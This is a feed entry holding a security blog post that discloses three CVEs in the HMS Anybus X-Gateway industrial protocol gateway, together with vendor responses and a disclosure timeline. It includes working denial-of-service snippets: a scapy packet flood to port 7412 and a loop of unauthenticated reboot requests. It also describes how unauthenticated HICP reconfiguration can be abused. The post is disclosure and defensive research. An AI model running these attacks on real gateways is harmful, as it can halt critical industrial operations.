{
  "items": [
    {
      "title": "Targeting an industrial protocol gateway",
      "link": "https://sensepost.com/blog/2024/targeting-an-industrial-protocol-gateway/",
      "pubDate": "Thu, 30 May 2024 11:19:55 +0000",
      "content:encoded": "<p>Inside industrial systems (also known as Operational Technology, or OT), devices communicate with each other and can be accessed over IP using familiar IT protocols (such as SSH, web services, etc.), as well as with a variety of industrial network protocols. Among them, you may have heard of Modbus, maybe S7comm, OPC-UA and a few others, but do you know all the industrial protocols you could find on industrial networks? It would take a lifetime to list them all, considering the field-specific standards, the manufacturer-dependent protocols and variations, the association-promoted specifications, and their numerous versions, layers, extensions and adaptations. In the end, an industrial process typically involves a collection of devices, servers and workstations that are likely to use many different protocols and still need to understand each other.</p>\n\n\n\n<p>When devices don&#x2019;t have any protocol in common to communicate, an additional component is required as a gateway to make the translation between protocols. &#xA0;From time to time, we encounter such gateways on industrial systems, but we barely see them as all they do is translate. However, these nearly invisible devices play a crucial role in the industrial process: if the translation stops, the communication between (part of) the devices involved in the process stops as well, which is critical in such environments.</p>\n\n\n\n<p>From an attacker&#x2019;s perspective, this means that targeting them may have significant consequences, and that their security must also be considered.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY1.png\"><img fetchpriority=\"high\" decoding=\"async\" width=\"1024\" height=\"322\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY1-1024x322.png\" alt=\"\" class=\"wp-image-74645\"></a></figure>\n\n\n\n<p>In light of that, I wanted to assess the security of a gateway model that I often encounter during penetration tests on OT: the Anybus X-Gateway from <a href=\"https://www.anybus.com/home\">HMS networks</a>. This device does the conversion from one protocol to another and has several models for several protocol translations. My target was the model <a href=\"https://www.anybus.com/technical-support/pages/files-and-documentation---x-gateway-classic?taxonId=baffc604-22ce-6706-92f4-ff00001bbfd4&amp;productId=39a33505-22ce-6706-92f4-ff00001bbfd4&amp;orderCode=AB7832\">AB7832-F</a>, firmware version 3.29.01. I found several vulnerabilities reported as <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23765\">CVE-2024-23765</a>, <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23766\">CVE-2024-23766</a> and <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23767\">CVE-2024-23767</a> that can be used to alter the configuration and make the device unavailable. In this article, I&#x2019;ll go through the testing process and share the technical details of my findings and HMS&#x2019; responses.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Through the gateway</h2>\n\n\n\n<p>A device such as the Anybus X-Gateway AB7832-F is typically used in an industrial environment, usually located in closed cabinets in restricted areas, which reduces the likelihood of unauthorized physical access.</p>\n\n\n\n<div class=\"wp-block-media-text is-stacked-on-mobile\" style=\"grid-template-columns:19% auto\"><figure class=\"wp-block-media-text__media\"><img decoding=\"async\" width=\"344\" height=\"526\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY2-1.jpg\" alt=\"\" class=\"wp-image-74647 size-full\"></figure><div class=\"wp-block-media-text__content\">\n<p>This particular model translates between <a href=\"https://www.odva.org/technology-standards/key-technologies/ethernet-ip/\">Ethernet/IP</a> over an IP link (although the IP in Ethernet/IP stands for Industrial Protocol but that&#x2019;s another story) and <a href=\"https://www.profibus.com/\">Profibus</a> over an RS-485 serial link. </p>\n</div></div>\n\n\n\n<p>Therefore, it is supposed to be connected to an IP network in an industrial system so that it can be configured and do what is needed: establish a link between devices that don&#x2019;t speak the same language. In a perfect world, the gateway is reachable on the network only by authorized users and devices from restricted OT locations, but do we live in a perfect world?</p>\n\n\n\n<p>To test our gateway, we mainly considered the scenario where an attacker can reach the gateway on the IP network, without physical access to it. This could happen, for instance, if the attacker is located on the OT network with direct access to the gateway or has managed to reach it from the IT network or from the Internet.</p>\n\n\n\n<p>Without further waiting, let&#x2019;s start talking to our gateway and see what we can do.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Network discovery</h2>\n\n\n\n<p>Although I read the manual and knew what the device did in theory, I did not know how it actually worked. Therefore, the first step was obviously to gather all the information I could, starting with UDP and TCP nmap scans.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Nmap scan report for boiboite (192.168.1.242)\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Multitech MultiVoip 410 VoIP gateway ftpd\n23/tcp    open  telnet        APC PDU/UPS devices or Windows CE telnetd\n80/tcp    open  http          HMS Anybus-S WebServer\n502/tcp   open  mbap?\n7412/tcp  open  unknown\n44818/tcp open  EtherNet-IP-2\n\nNmap scan report for boiboite (192.168.1.242)\nPORT      STATE         SERVICE       VERSION\n2222/udp  open|filtered msantipiracy\n3250/udp  open|filtered hicp\n7412/udp  open|filtered unknown\n44818/udp open          EtherNet-IP-2</code></pre>\n\n\n\n<p>A few comments about these results:</p>\n\n\n\n<ul>\n<li>We can see a few regular IT administration services on TCP: FTP, Telnet and HTTP. Not the most secure ones, if you ask me. I used all of them but is there anything left to say about their security? The only thing worth mentioning is that the Telnet service gives access to a very restricted shell.&#xA0;</li>\n\n\n\n<li>Some ports correspond to industrial network services. The associated protocols have weaknesses on their own as well, but this exceeds the scope of this article:\n<ul>\n<li>Port 502/tcp is for Modbus TCP, which is widely used in OT and supported by the gateway;</li>\n\n\n\n<li>Ports 44818/tcp, 44818/udp and 2222/udp are for Ethernet/IP, this is our entry point for protocol translation. &#xA0;I have not spent much time on this one yet but 44818/udp is uncommon, it could as well be something else and requires further investigation;</li>\n</ul>\n</li>\n\n\n\n<li>Port 3250/udp is used by the protocol HICP, which is the proprietary protocol used by HMS devices for IP network discovery and configuration. I took a good look at this one (see below);</li>\n\n\n\n<li>Does anyone recognise port 7412?</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Port 7412 and CVE-2024-23765</h2>\n\n\n\n<p>When encountering an unknown TCP service running on an unusual port, there are a few ways to find out what it is:</p>\n\n\n\n<ul>\n<li>Try to communicate with the service using various protocols (or by sending random junk) and deduce the protocol from the service&#x2019;s responses;</li>\n\n\n\n<li>Find what the port number is usually bound to on the Internet;</li>\n\n\n\n<li>Look for the answer in the device&#x2019;s documentation;</li>\n\n\n\n<li>Ask the manufacturer directly.</li>\n</ul>\n\n\n\n<p>As for port 7412, I tried all four ways: the service never responded to my requests, this port does not seem to be the standard port for any service, the documentation does not say a word about it and the technical support from HMS Networks told me that it had no idea either (really?).</p>\n\n\n\n<p><em>N.B.: Yours truly has a great passion for searching for (and finding) obscure industrial protocols and has recently encountered port 7412 again. She now has new clues and is back to investigate! In the meantime, please share any information you have with your local police district (or <a href=\"https://twitter.com/non_curat_lex\">myself</a>).</em></p>\n\n\n\n<p>Ultimately, there was no need to know what it was to make the device crash. After a few attempts at sending requests on port 7412, expecting responses from the service to identify it, the device stopped working. In fact, it appeared that<strong> all the network services of the gateway systematically become unresponsive after sending 85 requests to this port</strong>. The content and length of the frame sent to the device does not matter. The vulnerability was reported as <strong>CVE-2024-23765</strong>.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>from scapy.all import *\ntarget = IP(dst=&quot;192.168.1.242&quot;)/UDP(dport=7412, sport=50000)\npkt = target/Raw(b&quot;\\x00&quot;)\nfor i in range(85):\n   send(pkt)</code></pre>\n\n\n\n<p>As you can imagine, this can be leveraged by an attacker to stop network flows to and from affected devices. As critical operational network flows transit through these gateways, their failure could interrupt such operations. A physical restart is required to restore the device, but such operation may be difficult in industrial facilities as the device may not be reachable physically. Also, there is no power button, so it requires disconnecting it from the power supply.</p>\n\n\n\n<p>According to HMS networks, the bug comes from the physical components of the gateway, which means that there can be no patch to fix this vulnerability, the only solution is to replace the device.</p>\n\n\n\n<blockquote class=\"wp-block-quote is-layout-flow wp-block-quote-is-layout-flow\">\n<p>The root of the problem is related to how the product is designed, i.e. it uses a mainboard and daughter cards. The mainboard uses the API of the daughter cards to create TCP and UDP services on port 7412. Unfortunately the implementation on the mainboard isn&#x2019;t resilient against malformed packets, thus in the end this will starve the daughter card and it will run out of resources and make all other services on the daughter card unresponsive.</p>\n</blockquote>\n\n\n\n<h2 class=\"wp-block-heading\">Let&#x2019;s just use features (CVE-2024-23766)</h2>\n\n\n\n<p>At that point, we still don&#x2019;t know what port 7412 is but at least we know how to misuse it. We can try to misuse other services, where the word &#x201C;misuse&#x201D; can have two meanings: either we make the device do what it is not supposed to do, or we make it do what it is supposed to do, but not in the intended way.</p>\n\n\n\n<p>The gateway exposes the service HTTP to provide a web interface for network configuration and network diagnostics.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY3.png\"><img decoding=\"async\" width=\"734\" height=\"528\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY3.png\" alt=\"\" class=\"wp-image-74648\"></a></figure>\n\n\n\n<p>Fun fact: this interface does not require any authentication. Accessing it, we could mess with the network configuration and make it unreachable. But we can go further: when browsing the filesystem, I noticed (among others) a file called reboot.html, which is not used/callable in the web interface. Sending a get request to the URL http://&lt;ip&gt;/slave/reboot.html immediately reboots the gateway. Therefore, we could also <strong>use the reboot feature to carry out a denial-of-service attack by continuously sending unauthenticated GET requests to the associated URL</strong>. This vulnerability was reported as <strong>CVE-2024-23766.</strong></p>\n\n\n\n<pre class=\"wp-block-code\"><code>if len(argv) != 2:\n   print(&quot;Usage: {0} ip_address&quot;.format(argv[0]))\n   exit(-1)\nurl = &quot;http://{0}/slave/reboot.html&quot;.format(argv[1])\ntimeout = 30\nprint(&quot;Keep on sending GET requests to {0}&quot;.format(url))\nwhile True:\n   try:\n       res = request.urlopen(url, timeout=timeout)\n   except ConnectionResetError:\n       pass</code></pre>\n\n\n\n<p>Once again, this vulnerability can be used to stop the network flows to and from the device as it becomes completely unavailable. No need to investigate the cause, as what is going on is pretty obvious: it is a legitimate feature (but not meant to be called by the user) and it is not protected.</p>\n\n\n\n<p>How to resume operation when this attack is ongoing? The easiest way would probably be to isolate the device on the network (it&#x2019;s already down anyway) to prevent it from boot looping. Then, to prevent such an attack, the obvious thing to do would be to stop the HTTP service from the device&#x2019;s settings, but this gateway does not allow disabling services. Alternatively, one must restrict access to this service using network segmentation and filtering rules. Another option is to remove the reboot.html page from the filesystem using the FTP service and hope that there will be no side effect.</p>\n\n\n\n<p>However, as the web interface can be used to change the network settings anonymously, we can also alter the regular network flows, possibly preventing a process from running correctly and therefore achieving the same result with less effort.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Wait&#x2026; HICP ?? (CVE-2024-23767)</h2>\n\n\n\n<p>The web interface is not the only way to change the network configuration. When we follow the installation process, HMS Networks recommends using their tools (e.g. IPConfig) to find HMS devices on the network and to configure them.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY4.png\"><img loading=\"lazy\" decoding=\"async\" width=\"951\" height=\"693\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY4.png\" alt=\"\" class=\"wp-image-74649\"></a></figure>\n\n\n\n<p>Capturing the traffic while using it, we observe that the requests are being sent to the port 3250/udp that we saw previously, using the protocol <a href=\"https://github.com/Orange-Cyberdefense/awesome-industrial-protocols/blob/main/protocols/hicp.md\">HICP</a>. This is a proprietary protocol by HMS Networks primarily intended for devices&#x2019; IP network configuration. It is unencrypted, and supports authentication by setting a password, but authentication is disabled by default (by the way, I have never seen it enabled in real life). This means, at least, that:</p>\n\n\n\n<ul>\n<li>Unauthenticated users can change the network settings (same behavior as with the web interface) by sending legitimate requests to the device using the tools provided by HMS;</li>\n\n\n\n<li>Attackers can enable authentication with their own password, preventing legitimate users from changing the settings back.</li>\n</ul>\n\n\n\n<p>Let&#x2019;s make a proof of concept! To do this, we just send valid HICP requests to the device. Using the provided tools is enough, but I wanted to write an implementation of the protocol that can be used for further attacks (for instance, to write a fuzzer). We can see from the capture below that the protocol is text-based, quite straightforward and has few features and therefore few frames to implement, although sometimes the format is inconsistent between frames.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY5.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"375\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY5-1024x375.png\" alt=\"\" class=\"wp-image-74650\"></a></figure>\n\n\n\n<p>I used the amazing Scapy framework to write the implementation and <a href=\"https://github.com/secdev/scapy/blob/master/scapy/contrib/hicp.py\">HICP is now available as a layer</a> in Scapy&#x2019;s latest versions. We can now use it to write a script that can change the configuration, and even set a password if we want. The complete PoC is available on <a href=\"https://github.com/claire-lex/anybus-hicp/blob/main/hicp_config.py\">GitHub</a>.&#xA0;</p>\n\n\n\n<p>Once again, we can misuse legitimate features, essentially because they lack security measures. In addition to this, we can mention that, even when authentication is enabled by legitimate users:</p>\n\n\n\n<ul>\n<li>As the password is sent in clear text with every request, it could be eavesdropped;</li>\n\n\n\n<li>There is no password policy, we can set a weak password such as &#x2018;a&#x2019;;</li>\n\n\n\n<li>The service is not protected against bruteforce attacks to discover the password (<a href=\"https://github.com/claire-lex/anybus-hicp/blob/main/hicp_bruteforce.py\">PoC</a>).</li>\n</ul>\n\n\n\n<p>And of course, the authentication on HICP can be bypassed as the web interface also provides a feature to change the network settings, which remains unauthenticated, even when a password is set using HICP.</p>\n\n\n\n<p>As you can see, <strong>the protocol itself can be considered vulnerable</strong> and all these issues have been reported as <strong>CVE-2024-23767</strong>. This one is also very hard to fix, as it requires a complete review of the protocol&#x2019;s fundamentals. That is why HMS Networks developed the protocol SHICP, where S stands for Secure, to replace HICP. Since it is not supported by my test device, I am not able to review this new protocol.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Remediation</h2>\n\n\n\n<h3 class=\"wp-block-heading\">Disable the planet?</h3>\n\n\n\n<p>These three vulnerabilities rely on three different network services that should not interfere with the device&#x2019;s primary usage (HTTP, HICP, and probably port 7412?). Therefore, the first remediation we could think of is to disable the services that are not in use, especially if they are vulnerable.&#xA0;</p>\n\n\n\n<p>However, the device does not provide an easy way to disable any of the services and HMS Networks&#x2019; support confirmed that they can&#x2019;t be disabled. To restrict access to them, the quickest way is to do it on the network, using segmentation rules, possibly combined with threat detection.</p>\n\n\n\n<p>This prevents access to the vulnerable components but does not fix the vulnerabilities themselves, which would at least require to implement the means to disable services from the settings, remove the reboot feature, enable HICP authentication by default and ultimately use a more secure protocol.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Measures taken by HMS Networks</h3>\n\n\n\n<p>HMS Networks has a well-defined vulnerability disclosure process, it is easy to contact them. They also gave me regular updates on the actions taken in response to the publication, which is appreciated.&#xA0;</p>\n\n\n\n<p>Here is what they decided as a countermeasure: <strong>As there is a newer version of this Anybus device (</strong><a href=\"https://www.anybus.com/technical-support/pages/communicator-2x?taxonId=1af6a105-22ce-6706-92f4-ff00001bbfd4&amp;productId=0d79b705-22ce-6706-92f4-ff00001bbfd4&amp;orderCode=ABC4014\"><strong>ABC4014-A</strong></a><strong>), the vulnerabilities for this model will not be patched. </strong>To address the vulnerabilities, they published a document with guidelines on how to ensure the security of the gateway, published <a href=\"https://www.anybus.com/docs/librariesprovider7/default-document-library/manuals-design-guides/hms-scm-1202-231_1-0-rel.pdf?sfvrsn=eb2197d7_28\">here</a>.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY6.png\"><img loading=\"lazy\" decoding=\"async\" width=\"771\" height=\"206\" src=\"https://sensepost.com/img/pages/blog/2024/targeting-an-industrial-protocol-gateway/GATEWAY6.png\" alt=\"\" class=\"wp-image-74651\"></a></figure>\n\n\n\n<p>According to them, this new model (which I haven&#x2019;t tested) is not affected by these three vulnerabilities:</p>\n\n\n\n<ul>\n<li><strong>Denial of service on port 7412</strong>: The new version uses a completely different hardware and firmware and does not implement the same services on port 7412, therefore the attack is not supposed to work;</li>\n\n\n\n<li><strong>Reboot feature on web service</strong>: This unauthenticated URL endpoint is apparently not exposed, I have been told that the web service is the only service that can be disabled in this new version;</li>\n\n\n\n<li><strong>HICP protocol</strong>: The new version only supports SHICP, not HICP;</li>\n</ul>\n\n\n\n<p>This decision is quite understandable, especially considering that CVE-2024-23765 cannot be patched without replacing the hardware and that CVE-2024-23767 requires replacing the main protocol used for configuration (which has already be done in newer versions). Nevertheless, there are a few things we can discuss.</p>\n\n\n\n<p>First, a remediation which consists the replacement of devices to enhance cybersecurity is difficult to accept, especially considering that devices are likely to stay longer and to be more difficult to replace in OT than in IT (and they are expensive). Of course, updating devices in industrial systems is also very difficult, but maybe a little less so.</p>\n\n\n\n<p>Secondly, there are many versions of the same Anybus X-Gateway for different translations. My model appears to have a newer version, but this is not true for all models. HMS Networks confirmed that the other &#x201C;old&#x201D; models use the same hardware and firmware as the one I tested (e.g. <a href=\"https://www.anybus.com/technical-support/pages/files-and-documentation---x-gateway-classic?taxonId=bac6c404-22ce-6706-92f4-ff00001bbfd4&amp;productId=c1813505-22ce-6706-92f4-ff00001bbfd4&amp;orderCode=AB7956\">AB7956</a>, CC-Link IE Field Slave &#x2013; EtherNet/IP Adapter) and that some of them won&#x2019;t be replaced by the new versions. This means that we will continue to see in industrial systems the Anybus X-Gateway product line prone to these critical vulnerabilities for a long time.</p>\n\n\n\n<blockquote class=\"wp-block-quote is-layout-flow wp-block-quote-is-layout-flow\">\n<p>There will be some versions that won&#x2019;t be replaced by the new versions. All the old products are based on a platform that doesn&#x2019;t have the capabilities to defend against most vulnerabilities, even after updates. For the old products that we will keep and sell, precautions must be taken when installing the product, we will provide guidance in user manuals.</p>\n</blockquote>\n\n\n\n<p>Finally, the guideline warns about the security of devices interconnected, the device&#x2019;s physical security, the security of stored data and shows where the gateway must be in a state-of-the-art network architecture, but it does not say anything about network segmentation itself. Yet, it seems to me that the first recommendation we can make, given that we cannot patch or harden the device, is to restrict as much as possible the logical access to these devices from the network.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Wrap up</h2>\n\n\n\n<p>You may have noticed from this article that not all cybersecurity issues related to this device have been published as CVE. Indeed, this model shares the same issues as many industrial devices, as it was not designed with cybersecurity in mind. I could have submitted a vulnerability for the use of insecure IT protocols, one for lack of authentication on the web interface, another for clear-text passwords in the filesystem (I have not mentioned these yet), more for buggy features on the web interface, and so on. But I chose to focus on vulnerabilities that I consider worth talking about.</p>\n\n\n\n<p><strong>All three vulnerabilities were reported because they can be used to conduct trivial remote attacks to make the device unavailable in industrial environments where availability is critical most of the time:</strong></p>\n\n\n\n<ul>\n<li>One of the CVE causes crashes, another allows a very simple Denial of Service attack, and two of them can be used to legitimately change the configuration anonymously, which is already enough;</li>\n\n\n\n<li>They do not require a high level of knowledge to make use of them;</li>\n\n\n\n<li>They are very easy to uncover, by anyone, as they are all based on the regular usage of legitimate features.</li>\n</ul>\n\n\n\n<p>Moreover, devices such as this one make easy targets: a gateway is a component that is not directly part of the production process and that is likely to be left aside (sometimes even forgotten!) by the maintenance team. This means that it may not be considered for cybersecurity hardening (and it does not provide any features for hardening), and that an attack targeting it may be difficult to investigate if no one knows that this component is a target.</p>\n\n\n\n<p>At first, I wanted to test this device to find exploitable flaws in the implementation of industrial network protocols. As I made a short stop at these three vulnerabilities, I haven&#x2019;t done this part yet, and this is my next step. But so far, we don&#x2019;t even need that to do damage.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Timeline</h2>\n\n\n\n<ul>\n<li>July-August 2023: Tests performed.</li>\n\n\n\n<li>2023-09-25: Vulnerability reports sent to HMS Networks.</li>\n\n\n\n<li>2023-09-27 : Acknowledgement.</li>\n\n\n\n<li>2023-10-12 : Notice from HMS Networks: As the gateway AB7832-F replaced by new product ABC4014-A, the mitigation will only consist on a manual supplement to clarify how AB7832-F shall be used to ensure security.</li>\n\n\n\n<li>2024-01-25 : CVE-2024-23765, CVE-2024-23766, CVE-2024-23767 registered.</li>\n\n\n\n<li>2024-02-27 : Document &#x201C;Anybus Gateway Cybersecurity Guidelines&#x201D; published on HMS networks.</li>\n\n\n\n<li>2024-06-25 : Technical disclosure.</li>\n</ul>\n\n\n\n<p><em>Special thanks to Fredrik Brynolf (HMS Networks) and Jean-Pascal Thomas (Orange Cyberdefense)</em></p>\n",
      "content:encodedSnippet": "Inside industrial systems (also known as Operational Technology, or OT), devices communicate with each other and can be accessed over IP using familiar IT protocols (such as SSH, web services, etc.), as well as with a variety of industrial network protocols. Among them, you may have heard of Modbus, maybe S7comm, OPC-UA and a few others, but do you know all the industrial protocols you could find on industrial networks? It would take a lifetime to list them all, considering the field-specific standards, the manufacturer-dependent protocols and variations, the association-promoted specifications, and their numerous versions, layers, extensions and adaptations. In the end, an industrial process typically involves a collection of devices, servers and workstations that are likely to use many different protocols and still need to understand each other.\nWhen devices don’t have any protocol in common to communicate, an additional component is required as a gateway to make the translation between protocols.  From time to time, we encounter such gateways on industrial systems, but we barely see them as all they do is translate. However, these nearly invisible devices play a crucial role in the industrial process: if the translation stops, the communication between (part of) the devices involved in the process stops as well, which is critical in such environments.\nFrom an attacker’s perspective, this means that targeting them may have significant consequences, and that their security must also be considered.\n\n\n\n\nIn light of that, I wanted to assess the security of a gateway model that I often encounter during penetration tests on OT: the Anybus X-Gateway from HMS networks. This device does the conversion from one protocol to another and has several models for several protocol translations. My target was the model AB7832-F, firmware version 3.29.01. I found several vulnerabilities reported as CVE-2024-23765, CVE-2024-23766 and CVE-2024-23767 that can be used to alter the configuration and make the device unavailable. In this article, I’ll go through the testing process and share the technical details of my findings and HMS’ responses.\nThrough the gateway\nA device such as the Anybus X-Gateway AB7832-F is typically used in an industrial environment, usually located in closed cabinets in restricted areas, which reduces the likelihood of unauthorized physical access.\n\nThis particular model translates between Ethernet/IP over an IP link (although the IP in Ethernet/IP stands for Industrial Protocol but that’s another story) and Profibus over an RS-485 serial link. \n\n\n\n\nTherefore, it is supposed to be connected to an IP network in an industrial system so that it can be configured and do what is needed: establish a link between devices that don’t speak the same language. In a perfect world, the gateway is reachable on the network only by authorized users and devices from restricted OT locations, but do we live in a perfect world?\nTo test our gateway, we mainly considered the scenario where an attacker can reach the gateway on the IP network, without physical access to it. This could happen, for instance, if the attacker is located on the OT network with direct access to the gateway or has managed to reach it from the IT network or from the Internet.\nWithout further waiting, let’s start talking to our gateway and see what we can do.\nNetwork discovery\nAlthough I read the manual and knew what the device did in theory, I did not know how it actually worked. Therefore, the first step was obviously to gather all the information I could, starting with UDP and TCP nmap scans.\nNmap scan report for boiboite (192.168.1.242)\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Multitech MultiVoip 410 VoIP gateway ftpd\n23/tcp    open  telnet        APC PDU/UPS devices or Windows CE telnetd\n80/tcp    open  http          HMS Anybus-S WebServer\n502/tcp   open  mbap?\n7412/tcp  open  unknown\n44818/tcp open  EtherNet-IP-2\n\nNmap scan report for boiboite (192.168.1.242)\nPORT      STATE         SERVICE       VERSION\n2222/udp  open|filtered msantipiracy\n3250/udp  open|filtered hicp\n7412/udp  open|filtered unknown\n44818/udp open          EtherNet-IP-2\nA few comments about these results:\nWe can see a few regular IT administration services on TCP: FTP, Telnet and HTTP. Not the most secure ones, if you ask me. I used all of them but is there anything left to say about their security? The only thing worth mentioning is that the Telnet service gives access to a very restricted shell. \nSome ports correspond to industrial network services. The associated protocols have weaknesses on their own as well, but this exceeds the scope of this article:\n\nPort 502/tcp is for Modbus TCP, which is widely used in OT and supported by the gateway;\nPorts 44818/tcp, 44818/udp and 2222/udp are for Ethernet/IP, this is our entry point for protocol translation.  I have not spent much time on this one yet but 44818/udp is uncommon, it could as well be something else and requires further investigation;\nPort 3250/udp is used by the protocol HICP, which is the proprietary protocol used by HMS devices for IP network discovery and configuration. I took a good look at this one (see below);\nDoes anyone recognise port 7412?\nPort 7412 and CVE-2024-23765\nWhen encountering an unknown TCP service running on an unusual port, there are a few ways to find out what it is:\nTry to communicate with the service using various protocols (or by sending random junk) and deduce the protocol from the service’s responses;\nFind what the port number is usually bound to on the Internet;\nLook for the answer in the device’s documentation;\nAsk the manufacturer directly.\nAs for port 7412, I tried all four ways: the service never responded to my requests, this port does not seem to be the standard port for any service, the documentation does not say a word about it and the technical support from HMS Networks told me that it had no idea either (really?).\nN.B.: Yours truly has a great passion for searching for (and finding) obscure industrial protocols and has recently encountered port 7412 again. She now has new clues and is back to investigate! In the meantime, please share any information you have with your local police district (or myself).\nUltimately, there was no need to know what it was to make the device crash. After a few attempts at sending requests on port 7412, expecting responses from the service to identify it, the device stopped working. In fact, it appeared that all the network services of the gateway systematically become unresponsive after sending 85 requests to this port. The content and length of the frame sent to the device does not matter. The vulnerability was reported as CVE-2024-23765.\nfrom scapy.all import *\ntarget = IP(dst=\"192.168.1.242\")/UDP(dport=7412, sport=50000)\npkt = target/Raw(b\"\\x00\")\nfor i in range(85):\n   send(pkt)\nAs you can imagine, this can be leveraged by an attacker to stop network flows to and from affected devices. As critical operational network flows transit through these gateways, their failure could interrupt such operations. A physical restart is required to restore the device, but such operation may be difficult in industrial facilities as the device may not be reachable physically. Also, there is no power button, so it requires disconnecting it from the power supply.\nAccording to HMS networks, the bug comes from the physical components of the gateway, which means that there can be no patch to fix this vulnerability, the only solution is to replace the device.\nThe root of the problem is related to how the product is designed, i.e. it uses a mainboard and daughter cards. The mainboard uses the API of the daughter cards to create TCP and UDP services on port 7412. Unfortunately the implementation on the mainboard isn’t resilient against malformed packets, thus in the end this will starve the daughter card and it will run out of resources and make all other services on the daughter card unresponsive.\nLet’s just use features (CVE-2024-23766)\nAt that point, we still don’t know what port 7412 is but at least we know how to misuse it. We can try to misuse other services, where the word “misuse” can have two meanings: either we make the device do what it is not supposed to do, or we make it do what it is supposed to do, but not in the intended way.\nThe gateway exposes the service HTTP to provide a web interface for network configuration and network diagnostics.\n\n\n\n\nFun fact: this interface does not require any authentication. Accessing it, we could mess with the network configuration and make it unreachable. But we can go further: when browsing the filesystem, I noticed (among others) a file called reboot.html, which is not used/callable in the web interface. Sending a get request to the URL http://<ip>/slave/reboot.html immediately reboots the gateway. Therefore, we could also use the reboot feature to carry out a denial-of-service attack by continuously sending unauthenticated GET requests to the associated URL. This vulnerability was reported as CVE-2024-23766.\nif len(argv) != 2:\n   print(\"Usage: {0} ip_address\".format(argv[0]))\n   exit(-1)\nurl = \"http://{0}/slave/reboot.html\".format(argv[1])\ntimeout = 30\nprint(\"Keep on sending GET requests to {0}\".format(url))\nwhile True:\n   try:\n       res = request.urlopen(url, timeout=timeout)\n   except ConnectionResetError:\n       pass\nOnce again, this vulnerability can be used to stop the network flows to and from the device as it becomes completely unavailable. No need to investigate the cause, as what is going on is pretty obvious: it is a legitimate feature (but not meant to be called by the user) and it is not protected.\nHow to resume operation when this attack is ongoing? The easiest way would probably be to isolate the device on the network (it’s already down anyway) to prevent it from boot looping. Then, to prevent such an attack, the obvious thing to do would be to stop the HTTP service from the device’s settings, but this gateway does not allow disabling services. Alternatively, one must restrict access to this service using network segmentation and filtering rules. Another option is to remove the reboot.html page from the filesystem using the FTP service and hope that there will be no side effect.\nHowever, as the web interface can be used to change the network settings anonymously, we can also alter the regular network flows, possibly preventing a process from running correctly and therefore achieving the same result with less effort.\nWait… HICP ?? (CVE-2024-23767)\nThe web interface is not the only way to change the network configuration. When we follow the installation process, HMS Networks recommends using their tools (e.g. IPConfig) to find HMS devices on the network and to configure them.\n\n\n\n\nCapturing the traffic while using it, we observe that the requests are being sent to the port 3250/udp that we saw previously, using the protocol HICP. This is a proprietary protocol by HMS Networks primarily intended for devices’ IP network configuration. It is unencrypted, and supports authentication by setting a password, but authentication is disabled by default (by the way, I have never seen it enabled in real life). This means, at least, that:\nUnauthenticated users can change the network settings (same behavior as with the web interface) by sending legitimate requests to the device using the tools provided by HMS;\nAttackers can enable authentication with their own password, preventing legitimate users from changing the settings back.\nLet’s make a proof of concept! To do this, we just send valid HICP requests to the device. Using the provided tools is enough, but I wanted to write an implementation of the protocol that can be used for further attacks (for instance, to write a fuzzer). We can see from the capture below that the protocol is text-based, quite straightforward and has few features and therefore few frames to implement, although sometimes the format is inconsistent between frames.\n\n\n\n\nI used the amazing Scapy framework to write the implementation and HICP is now available as a layer in Scapy’s latest versions. We can now use it to write a script that can change the configuration, and even set a password if we want. The complete PoC is available on GitHub. \nOnce again, we can misuse legitimate features, essentially because they lack security measures. In addition to this, we can mention that, even when authentication is enabled by legitimate users:\nAs the password is sent in clear text with every request, it could be eavesdropped;\nThere is no password policy, we can set a weak password such as ‘a’;\nThe service is not protected against bruteforce attacks to discover the password (PoC).\nAnd of course, the authentication on HICP can be bypassed as the web interface also provides a feature to change the network settings, which remains unauthenticated, even when a password is set using HICP.\nAs you can see, the protocol itself can be considered vulnerable and all these issues have been reported as CVE-2024-23767. This one is also very hard to fix, as it requires a complete review of the protocol’s fundamentals. That is why HMS Networks developed the protocol SHICP, where S stands for Secure, to replace HICP. Since it is not supported by my test device, I am not able to review this new protocol.\nRemediation\nDisable the planet?\nThese three vulnerabilities rely on three different network services that should not interfere with the device’s primary usage (HTTP, HICP, and probably port 7412?). Therefore, the first remediation we could think of is to disable the services that are not in use, especially if they are vulnerable. \nHowever, the device does not provide an easy way to disable any of the services and HMS Networks’ support confirmed that they can’t be disabled. To restrict access to them, the quickest way is to do it on the network, using segmentation rules, possibly combined with threat detection.\nThis prevents access to the vulnerable components but does not fix the vulnerabilities 